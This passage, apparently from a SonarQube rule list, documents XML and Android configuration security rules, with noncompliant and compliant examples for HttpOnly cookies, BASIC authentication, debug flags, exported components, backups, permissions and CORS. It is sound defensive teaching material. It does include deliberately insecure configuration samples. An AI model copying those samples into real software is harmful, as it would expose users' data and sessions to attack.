 &lt;cookie-config&gt; &lt;!-- Sensitive: http-only tag is missing defaulting to false --&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;http-only&gt;true&lt;/http-only&gt; &lt;!-- Compliant --&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3374">
              xml:S3374
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>According to the Common Weakness Enumeration,</p>
<blockquote>
  <p>If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards
  the other. This decision might not correspond to the programmer’s expectations…​</p>
</blockquote>
<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>
<h3>Noncompliant code example</h3>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name&#61;&#34;BookForm&#34;&gt; ... &lt;/form&gt;
    &lt;form name&#61;&#34;BookForm&#34;&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name&#61;&#34;BookForm&#34;&gt; ... &lt;/form&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/102" rel="nofollow">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation" rel="nofollow">OWASP, Improper Data Validation</a> - Struts: Duplicate
  Validation Forms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S2647">
              xml:S2647
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Basic authentication’s only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used.</p>
<h3>Noncompliant code example</h3>
<pre>
// in web.xml
&lt;web-app  ...&gt;
  &lt;!--  ...  --&gt;
  &lt;login-config&gt;
    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;
  &lt;/login-config&gt;
&lt;/web-app&gt;
</pre>
<h3>Exceptions</h3>
<p>The rule will not raise any issue if HTTPS is enabled, on any URL-pattern.</p>
<pre>
&lt;web-app  ...&gt;
  &lt;!--  ...  --&gt;
  &lt;security-constraint&gt;
    &lt;web-resource-collection&gt;
      &lt;web-resource-name&gt;HTTPS enabled&lt;/web-resource-name&gt;
      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
    &lt;/web-resource-collection&gt;
    &lt;user-data-constraint&gt;
      &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;
    &lt;/user-data-constraint&gt;
  &lt;/security-constraint&gt;
&lt;/web-app&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication" rel="nofollow">OWASP Web Service Security
  Cheat Sheet</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/522" rel="nofollow">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S4507">
              xml:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production.</p>
<p>Activating a development feature in production can have an important range of consequences depending on its use:</p>
<ul><li> Technical information leak; generally by disclosing verbose logging information to the application’s user. </li><li> Arbitrary code execution; generally with a parameter that will allow the remote debugging or profiling of the application. </li></ul>
<p>In all cases, the attack surface of an affected application is increased. In some cases, such features can also make the exploitation of other
unrelated vulnerabilities easier.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The development of the app is completed and the development feature is activated. </li><li> The app is distributed to end users with the &#96;development feature activated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Applications should be released without any development feature activated. When such features are required when in the development process of the
application, they should only apply to a build variant that is dedicated to development environments. That variant should not be set as the default
build configuration to prevent any unattended development feature exposition.</p>
<h2>Sensitive Code Example</h2>
<p>In <code>AndroidManifest.xml</code> the android debuggable property is set to <code>true</code>. The application will therefore be debuggable.</p>
<pre>
&lt;application
  android:icon&#61;&#34;&#64;mipmap/ic_launcher&#34;
  android:label&#61;&#34;&#64;string/app_name&#34;
  android:roundIcon&#61;&#34;&#64;mipmap/ic_launcher_round&#34;
  android:supportsRtl&#61;&#34;true&#34;
  android:debuggable&#61;&#34;true&#34;
  android:theme&#61;&#34;&#64;style/AppTheme&#34;&gt;
&lt;/application&gt;  &lt;!-- Sensitive --&gt;
</pre>
<p>In a <code>web.config</code> file, the <code>customErrors</code> element’s <code>mode</code> attribute is set to <code>Off</code>. The application
will disclose unnecessarily verbose information to its users upon error.</p>
<pre>
&lt;configuration&gt;
  &lt;system.web&gt;
    &lt;customErrors mode&#61;&#34;Off&#34; /&gt; &lt;!-- Sensitive --&gt;
  &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<p>In <code>AndroidManifest.xml</code> the android debuggable property is set to <code>false</code>:</p>
<pre>
&lt;application
  android:icon&#61;&#34;&#64;mipmap/ic_launcher&#34;
  android:label&#61;&#34;&#64;string/app_name&#34;
  android:roundIcon&#61;&#34;&#64;mipmap/ic_launcher_round&#34;
  android:supportsRtl&#61;&#34;true&#34;
  android:debuggable&#61;&#34;false&#34;
  android:theme&#61;&#34;&#64;style/AppTheme&#34;&gt;
&lt;/application&gt; &lt;!-- Compliant --&gt;
</pre>
<p>In a <code>web.config</code> file, the <code>customErrors</code> element’s <code>mode</code> attribute is set to <code>On</code>:</p>
<pre>
&lt;configuration&gt;
  &lt;system.web&gt;
    &lt;customErrors mode&#61;&#34;On&#34; /&gt; &lt;!-- Compliant --&gt;
  &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x12-v7-code_quality_and_build_setting_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Code Quality and Build Setting Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality" rel="nofollow">OWASP Mobile Top 10 2016 Category M10</a> -
  Extraneous Functionality </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li><li> <a href="https://developer.android.com/studio/publish/preparing" rel="nofollow">developer.android.com</a> - Prepare for release </li><li> <a href="https://learn.microsoft.com/en-us/aspnet/web-forms/overview/getting-started/getting-started-with-aspnet-45-web-forms/aspnet-error-handling" rel="nofollow">learn.microsoft.com</a> - ASP.NET Error Handling </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5594">
              xml:S5594
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Once an Android component has been exported, it can be used by attackers to launch malicious actions and might also give access to other components
that are not exported.</p>
<p>As a result, sensitive user data can be stolen, and components can be launched unexpectedly.</p>
<p>For this reason, the following components should be protected:</p>
<ul><li> Providers </li><li> Activities </li><li> Activity-aliases </li><li> Services </li></ul>
<p>To do so, it is recommended to either set <code>exported</code> to <code>false</code>, add <code>android:readPermission</code> and
<code>android:writePermission</code> attributes, or add a <code>&lt;permission&gt;</code> tag.</p>
<p><strong>Warning</strong>: When targeting Android versions lower than 12, the presence of intent filters will cause <code>exported</code> to be
set to <code>true</code> by default.</p>
<p>If a component must be exported, use a <code>&lt;permission&gt;</code> tag and the <a href="https://developer.android.com/guide/topics/manifest/permission-element#plevel" rel="nofollow">protection level</a> that matches your use case and data
confidentiality requirements.<br /> For example, <a href="https://developer.android.com/training/sync-adapters" rel="nofollow">Sync adapters</a> should use a
<code>signature</code> protection level to remain both exported <strong>and</strong> protected.</p>
<h3>Noncompliant code example</h3>
<p>The following components are vulnerable because permissions are undefined or partially defined:</p>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.Provider&#34;
  android:name&#61;&#34;com.example.app.Provider&#34;
  android:exported&#61;&#34;true&#34;
  android:readPermission&#61;&#34;com.example.app.READ_PERMISSION&#34; /&gt;  &lt;!-- Noncompliant: write permission is not defined --&gt;
</pre>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.Provider&#34;
  android:name&#61;&#34;com.example.app.Provider&#34;
  android:exported&#61;&#34;true&#34;
  android:writePermission&#61;&#34;com.example.app.WRITE_PERMISSION&#34; /&gt;  &lt;!-- Noncompliant: read permission is not defined --&gt;
</pre>
<pre>
&lt;activity android:name&#61;&#34;com.example.activity.Activity&#34;&gt;  &lt;!-- Noncompliant: permissions are not defined --&gt;
  &lt;intent-filter&gt;
    &lt;action android:name&#61;&#34;com.example.OPEN_UI&#34;/&gt;
    &lt;category android:name&#61;&#34;android.intent.category.DEFAULT&#34;/&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</pre>
<h3>Compliant solution</h3>
<p>If the component’s capabilities or data are not intended to be shared with other apps, its <code>exported</code> attribute should be set to
<code>false</code>:</p>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.Provider&#34;
  android:name&#61;&#34;com.example.app.Provider&#34;
  android:exported&#61;&#34;false&#34; /&gt;
</pre>
<p>Otherwise, implement permissions:</p>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.Provider&#34;
  android:name&#61;&#34;com.example.app.Provider&#34;
  android:exported&#61;&#34;true&#34;
  android:readPermission&#61;&#34;com.example.app.READ_PERMISSION&#34;
  android:writePermission&#61;&#34;com.example.app.WRITE_PERMISSION&#34; /&gt;

&lt;activity android:name&#61;&#34;com.example.activity.Activity&#34;
          android:permission&#61;&#34;com.example.app.PERMISSION&#34; &gt;
  &lt;intent-filter&gt;
    &lt;action android:name&#61;&#34;com.example.OPEN_UI&#34;/&gt;
    &lt;category android:name&#61;&#34;android.intent.category.DEFAULT&#34; /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions" rel="nofollow">developer.android.com</a> - Implementing
  content provider permissions </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  platform usage </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://cwe.mitre.org/data/definitions/926" rel="nofollow">MITRE, CWE-926</a> - Improper Export of Android Application Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S6361">
              xml:S6361
            </a>
          </td>
          <td>
            <details>
              <p><code>android:permission</code> is used to set a single permission for both reading and writing data from a content provider. In regard to the
Principle of Least Privilege, client applications that consume the content provider should only have the necessary privileges to complete their tasks.
As <code>android:permission</code> grants both read and write access, it prevents client applications from applying this principle. In practice, it
means client applications that require read-only access will have to ask for more privileges than what they need: the content provider will always
grant read and write together.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some client applications consuming the content provider may only require read permission. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid using <code>android:permission</code> attribute alone. Instead <code>android:readPermission</code> and
  <code>android:writePermission</code> attributes to define separate read and write permissions. </li><li> Avoid using the same permission for <code>android:readPermission</code> and <code>android:writePermission</code> attributes. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.Provider&#34;
  android:name&#61;&#34;com.example.app.Provider&#34;
  android:permission&#61;&#34;com.example.app.PERMISSION&#34;  &lt;!-- Sensitive --&gt;
  android:exported&#61;&#34;true&#34;/&gt;
</pre>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.Provider&#34;
  android:name&#61;&#34;com.example.app.Provider&#34;
  android:readPermission&#61;&#34;com.example.app.PERMISSION&#34;  &lt;!-- Sensitive --&gt;
  android:writePermission&#61;&#34;com.example.app.PERMISSION&#34; &lt;!-- Sensitive --&gt;
  android:exported&#61;&#34;true&#34;/&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;provider
  android:authorities&#61;&#34;com.example.app.MyProvider&#34;
  android:name&#61;&#34;com.example.app.MyProvider&#34;
  android:readPermission&#61;&#34;com.example.app.READ_PERMISSION&#34;
  android:writePermission&#61;&#34;com.example.app.WRITE_PERMISSION&#34;
  android:exported&#61;&#34;true&#34;/&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions" rel="nofollow">developer.android.com</a> - Implementing
  content provider permissions </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  platform usage </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m6-insecure-authorization" rel="nofollow">OWASP Mobile Top 10 2016 Category M6</a> - Insecure
  Authorization </li><li> <a href="https://cwe.mitre.org/data/definitions/1220" rel="nofollow">MITRE, CWE-1220</a> - Insufficient Granularity of Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S6359">
              xml:S6359
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Defining a custom permission in the <code>android.permission</code> namespace may result in an unexpected permission assignment if a newer version
of Android adds a permission with the same name. It is recommended to use a namespace specific to the application for custom permissions.</p>
<h3>Noncompliant code example</h3>
<pre>
&lt;?xml version&#61;&#34;1.0&#34; encoding&#61;&#34;utf-8&#34;?&gt;
&lt;manifest xmlns:android&#61;&#34;http://schemas.android.com/apk/res/android&#34;
    package&#61;&#34;com.organization.app&#34;&gt;

    &lt;permission
        android:name&#61;&#34;android.permission.MYPERMISSION&#34; /&gt; &lt;!-- Noncompliant --&gt;

&lt;/manifest&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
&lt;?xml version&#61;&#34;1.0&#34; encoding&#61;&#34;utf-8&#34;?&gt;
&lt;manifest xmlns:android&#61;&#34;http://schemas.android.com/apk/res/android&#34;
    package&#61;&#34;com.organization.app&#34;&gt;

    &lt;permission
        android:name&#61;&#34;com.organization.app.permission.MYPERMISSION&#34; /&gt;

&lt;/manifest&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/265" rel="nofollow">MITRE, CWE-265</a> - Privilege Issues </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://developer.android.com/guide/topics/permissions/defining" rel="nofollow">developer.android.com</a> - Define a Custom App Permission </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5322">
              xml:S5322
            </a>
          </td>
          <td>
            <details>
              <p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led
in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-1677" rel="nofollow">CVE-2019-1677</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-1275" rel="nofollow">CVE-2015-1275</a> </li></ul>
<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will
start the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>
<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications
that can send broadcasts to the receiver.</p>
<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a
broadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a
message to the receiver.</p>
<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The data extracted from intents is not sanitized. </li><li> Intents broadcast is not restricted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See the <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;receiver android:name&#61;&#34;.MyBroadcastReceiver&#34; android:exported&#61;&#34;true&#34;&gt;  &lt;!-- Sensitive --&gt;
    &lt;intent-filter&gt;
        &lt;action android:name&#61;&#34;android.intent.action.AIRPLANE_MODE&#34;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</pre>
<h2>Compliant Solution</h2>
<p>Enforce permissions:</p>
<pre>
&lt;receiver android:name&#61;&#34;.MyBroadcastReceiver&#34;
    android:permission&#61;&#34;android.permission.SEND_SMS&#34;
    android:exported&#61;&#34;true&#34;&gt;
    &lt;intent-filter&gt;
        &lt;action android:name&#61;&#34;android.intent.action.AIRPLANE_MODE&#34;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</pre>
<p>Do not export the receiver and only receive system intents:</p>
<pre>
&lt;receiver android:name&#61;&#34;.MyBroadcastReceiver&#34; android:exported&#61;&#34;false&#34;&gt;
    &lt;intent-filter&gt;
        &lt;action android:name&#61;&#34;android.intent.action.AIRPLANE_MODE&#34;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/925" rel="nofollow">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li><li> <a href="https://cwe.mitre.org/data/definitions/926" rel="nofollow">MITRE, CWE-926</a> - Improper Export of Android Application Components </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S6358">
              xml:S6358
            </a>
          </td>
          <td>
            <details>
              <p>Android has a built-in backup mechanism that can save and restore application data. When application backup is enabled, local data from your
application can be exported to Google Cloud or to an external device via <code>adb backup</code>. Enabling Android backup exposes your application to
disclosure of sensitive data. It can also lead to corruption of local data when restoration is performed from an untrusted source.</p>
<p>By default application backup is enabled and it includes:</p>
<ul><li> Shared preferences files </li><li> Files saved in one of the paths returned by
    <ul><li> <a href="https://developer.android.com/reference/android/content/Context#getDatabasePath%28java.lang.String%29" rel="nofollow">getDatabasePath(String)</a>
      </li><li> <a href="https://developer.android.com/reference/android/content/Context#getFilesDir%28%29" rel="nofollow">getFilesDir()</a> </li><li> <a href="https://developer.android.com/reference/android/content/Context#getDir%28java.lang.String,%20int%29" rel="nofollow">getDir(String, int)</a> </li><li> <a href="https://developer.android.com/reference/android/content/Context#getExternalFilesDir%28java.lang.String%29" rel="nofollow">getExternalFilesDir(String)</a>
      </li></ul>  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application backup is enabled and sensitive data is stored in local files, local databases, or shared preferences. </li><li> Your application never validates data from files that are included in backups. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Disable application backup unless it is required for your application to work properly. </li><li> Narrow the scope of backed-up files by using either
    <ul><li> backup rules (see <code>android:fullBackupContent</code> attribute). </li><li> a custom <code>BackupAgent</code>. </li><li> the dedicated <code>no_backup</code> folder (see <code>android.content.Context#getNoBackupFilesDir()</code>). </li></ul>  </li><li> Do not back up local data containing sensitive information unless they are properly encrypted. </li><li> Make sure that the keys used to encrypt backup data are not included in the backup. </li><li> Validate data from backed-up files. They should be considered untrusted as they could have been restored from an untrusted source. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;application
    android:allowBackup&#61;&#34;true&#34;&gt; &lt;!-- Sensitive --&gt;
&lt;/application&gt;
</pre>
<h2>Compliant Solution</h2>
<p>Disable application backup.</p>
<pre>
&lt;application
    android:allowBackup&#61;&#34;false&#34;&gt;
&lt;/application&gt;
</pre>
<p>If targeting Android 6.0 or above (API level 23), define files to include/exclude from the application backup.</p>
<pre>
&lt;application
    android:allowBackup&#61;&#34;true&#34;
    android:fullBackupContent&#61;&#34;&#64;xml/backup.xml&#34;&gt;
&lt;/application&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://developer.android.com/guide/topics/data/autobackup" rel="nofollow">Back up user data with Auto Backup</a> </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  platform usage </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/312" rel="nofollow">MITRE, CWE-922</a> - Insecure Storage of Sensitive Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5604">
              xml:S5604
            </a>
          </td>
          <td>
            <details>
              <p>Permissions that can have a large impact on user privacy, marked as <a href="https://developer.android.com/reference/android/Manifest.permission" rel="nofollow">dangerous or &#34;not for use by third-party applications&#34; by Android</a>,
should be requested only if they are really necessary to implement critical features of an application.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> It is not sure that <code>dangerous</code> permissions requested by the application are <a href="https://developer.android.com/training/permissions/usage-notes#avoid_requesting_unnecessary_permissions" rel="nofollow">really necessary</a>. </li><li> The users are not <a href="https://developer.android.com/training/permissions/usage-notes#be_transparent" rel="nofollow">clearly informed</a> why and when
  dangerous permissions are requested by the application. </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to carefully review all the permissions and to use <code>dangerous</code> ones only if they are really necessary.</p>
<h2>Sensitive Code Example</h2>
<p>In AndroidManifest.xml:</p>
<pre>
&lt;uses-permission android:name&#61;&#34;android.permission.ACCESS_FINE_LOCATION&#34; /&gt; &lt;!-- Sensitive --&gt;
&lt;uses-permission android:name&#61;&#34;android.permission.ACCESS_MEDIA_LOCATION&#34; /&gt; &lt;!-- Sensitive --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;uses-permission android:name&#61;&#34;android.permission.ACCESS_NETWORK_STATE&#34; /&gt; &lt;!-- Compliant --&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://developer.android.com/training/permissions/usage-notes" rel="nofollow">developer.android.com</a> - App permissions best practices </li><li> <a href="https://play.google.com/about/privacy-security-deception/permissions/" rel="nofollow">Google Play</a> - Privacy, Security, and Deception -
  Permissions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5122">
              xml:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;!-- Tomcat 7&#43; Cors Filter --&gt;
&lt;filter&gt;
  &lt;filter-name&gt;CorsFilter&lt;/filter-name&gt;
